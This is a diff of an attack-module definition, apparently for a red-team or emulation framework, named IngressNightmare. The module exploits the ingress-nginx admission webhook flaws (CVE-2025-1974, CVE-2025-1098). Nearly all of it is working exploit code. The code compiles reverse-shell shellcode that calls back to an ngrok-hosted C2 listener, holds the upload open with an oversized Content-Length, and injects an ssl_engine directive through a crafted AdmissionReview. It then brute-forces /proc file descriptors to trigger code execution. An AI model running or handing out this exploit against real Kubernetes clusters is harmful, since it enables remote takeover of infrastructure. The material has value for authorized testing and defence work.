@@ -2,7 +2,7 @@ name: IngressNightmare
 description: |
   Exploit IngressNightmare vulnerabilities ) to get RCE in nginx-controller.
   Using CVE-2025-1974, a shared object file is uploaded to the ingress controller and the request is kept alive using a larger `Content-Lenght` header.
-  Using one of CVE-2025-1097, CVE-2025-1098 or CVE-2025-24514, the `ssl-engine` directive is injected referencing the malicious shared object.
+  CVE-2025-1098 is used to inject the `ssl-engine` directive referencing the malicious shared object.
   When this AdmissionReviewRequest is sent to the validation webhook the configuration is tested using `nginx -t` command. 
   This executes shared object in the configuration and triggers the RCE.
 tactic: Execution
@@ -12,7 +12,7 @@ parameters:
     type: string
     description: the URL of the C2 listener
     #default: "$LISTENER:$LISTENER_PORT"
-    default: "2.tcp.eu.ngrok.io:13077"
+    default: "7.tcp.eu.ngrok.io:14535"
   INGRESS:
     type: string
     description: The URL of the ingress controller
@@ -40,6 +40,8 @@ cmdVariants:
     execute:
       lang: python
       envVars: ["VIRTUAL_ENV=/Users/me/Dev/Ran/examples/.venv"]
+      # "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine REPLACEME;\n#",
+      # "nginx.ingress.kubernetes.io/auth-tls-secret": "default/test-tls"
       code: |-
         import asyncio
         import os
@@ -69,12 +71,14 @@ cmdVariants:
             return 1;
         }"""
 
-        # data_req = json.loads(r"""
         data_req = r"""{
           "kind": "AdmissionReview",
           "apiVersion": "admission.k8s.io/v1",
+          "name": "kubernetes",
+          "namespace": "default",
+          "operation": "CREATE",
           "request": {
-            "uid": "85b707bf-4241-4f9b-9ee8-7809c7132cdc",
+            "uid": "4532fede-639d-43b6-8ff5-95acaae27821",
             "kind": {
               "group": "networking.k8s.io",
               "version": "v1",
@@ -95,12 +99,9 @@ cmdVariants:
               "version": "v1",
               "resource": "ingresses"
             },
-            "name": "kubernetes",
-            "namespace": "default",
-            "operation": "CREATE",
             "userInfo": {
               "username": "kube-review",
-              "uid": "60a7a2da-f9ec-4afc-baaa-11bf648233a8"
+              "uid": "4532fede-639d-43b6-8ff5-95acaae27821"
             },
             "object": {
               "kind": "Ingress",
@@ -108,49 +109,23 @@ cmdVariants:
               "metadata": {
                 "name": "my-ingress",
                 "namespace": "default",
-                "creationTimestamp": null,
+                "uid": "4532fede-639d-43b6-8ff5-95acaae27821#;\n\n}\n}\n}\nssl_engine REPLACEME",
                 "annotations": {
-                  "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine REPLACEME;\n#",
-                  "nginx.ingress.kubernetes.io/auth-tls-secret": "default/test-tls"
+                  "nginx.ingress.kubernetes.io/mirror-target": "fake-mirror-target"
                 }
               },
               "spec": {
                 "ingressClassName": "nginx",
                 "rules": [
                   {
-                    "host": "xxx.example.com",
-                    "http": {
-                      "paths": [
-                        {
-                          "path": "/",
-                          "pathType": "Prefix",
-                          "backend": {
-                            "service": {
-                              "name": "kubernetes",
-                              "port": {
-                                "number": 5244
-                              }
-                            }
-                          }
-                        }
-                      ]
-                    }
+                    "host": "example.com",
+                    "http": { "paths": [] }
                   }
                 ]
-              },
-              "status": {
-                "loadBalancer": {}
               }
-            },
-            "oldObject": null,
-            "dryRun": true,
-            "options": {
-              "kind": "CreateOptions",
-              "apiVersion": "meta.k8s.io/v1"
             }
           }
-        }
-        """
+        }"""
 
         def build_shellcode(host: str, port: int) -> str:
             payload_dir = Path(os.getcwd()) / "payload"
@@ -207,15 +182,9 @@ cmdVariants:
             with open(shellcode_path, "rb") as f:
                 shellcode = f.read()
             print("[+] Shellcode loaded successfully.")
-
-            # with open("review.json", "r") as f:
-            #    review_template = f.read()
             upload_tasks = [upload_shellcode(ingress_url, shellcode) for _ in range(1)]
             admission_task = send_admission_req(admission_url, data_req)
             await asyncio.gather(*upload_tasks, admission_task)
-            # await asyncio.gather(*upload_tasks)
-            print("[+] Exploit completed. Check your listener for incoming connection.")
-
 
         async def upload_shellcode(target_url: str, shellcode) -> None:
             """Upload shellcode through HTTP request"""
@@ -256,7 +225,7 @@ cmdVariants:
             target_url = target_url.rstrip("/") + "/admission"
             async with httpx.AsyncClient(verify=False) as client:
                 success = False
-                for pid in range(27, 200):
+                for pid in range(26, 28):
                     if success:
                         break
                     for fd in range(2, 200):
@@ -291,63 +260,6 @@ cmdVariants:
                             # fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                             # print(exc_type, fname, exc_tb.tb_lineno)
 
-
-        def async_main(ingress: str, admission: str, c2: str, local_mode: bool = False):
-            if local_mode:
-                admission_url = f"https://localhost:{admission_port}/validate"
-                target_url = f"http://localhost:{ingress_port}/fake/addr"
-            else:
-                admission_url = (
-                    "https://ingress-nginx-controller-admission.ingress-nginx.svc:443/validate"
-                )
-                target_url = "http://ingress-nginx-controller.ingress-nginx.svc/fake/addr"
-            asyncio.run(run_exploit(ingress, admission, c2))
-
-
-        def main(listener_ip: str, listener_port: int, local_mode: bool = False):
-            """Run the complete exploit chain"""
-            print(f"[*] Reverse shell will connect to {listener_ip}:{listener_port}")
-            shellcode_path = build_shellcode(listener_ip, listener_port)
-            with open(shellcode_path, "rb") as f:
-                shellcode = f.read()
-            print("[+] Shellcode loaded successfully.")
-
-            import http.client
-
-            # Set target URL based on local mode flag
-            if local_mode:
-                target_url = "http://localhost:8080/fake/addr"
-            else:
-                target_url = "http://ingress-nginx-controller.ingress-nginx.svc/fake/addr"
-
-            # Parse target URL to extract host, port, and path
-            parsed = urlparse(target_url)
-            host = parsed.hostname
-            port = parsed.port or 80
-            path = parsed.path if parsed.path else "/"
-
-            # Prepare headers
-            # Multiply the shellcode length to simulate a large Content-Length
-            headers = {
-                "Content-Type": "application/octet-stream",
-                "Content-Length": str(len(shellcode) * 50),
-                "Connection": "keep-alive",
-            }
-
-            print(f"[*] Connecting to {host}:{port} and sending shellcode via POST request...")
-            conn = http.client.HTTPConnection(host, port, timeout=60)
-            try:
-                conn.request("POST", path, body=shellcode, headers=headers)
-                response = conn.getresponse()
-                print(f"[+] Upload response: {response.status} {response.reason}")
-                data = response.read()
-                print("[+] Response body:")
-                print(data.decode(errors="ignore"))
-            except Exception as e:
-                print(f"[!] Error during POST request: {e}")
-            finally:
-                conn.close()
-
         if __name__ == "__main__":
             import os
             print("Current working directory:", os.getcwd())
@@ -357,5 +269,5 @@ cmdVariants:
             parser.add_argument( "--ingress", type=str, default="http://ingress-nginx-controller.ingress-nginx.svc")
             parser.add_argument( "--admission", type=str, default="https://ingress-nginx-controller-admission.ingress-nginx.svc:443")
             args = parser.parse_args()
-            async_main(args.ingress, args.admission, args.c2, args.local)
+            asyncio.run(run_exploit(args.ingress, args.admission, args.c2))
             # main(args.ip, args.port, args.local)
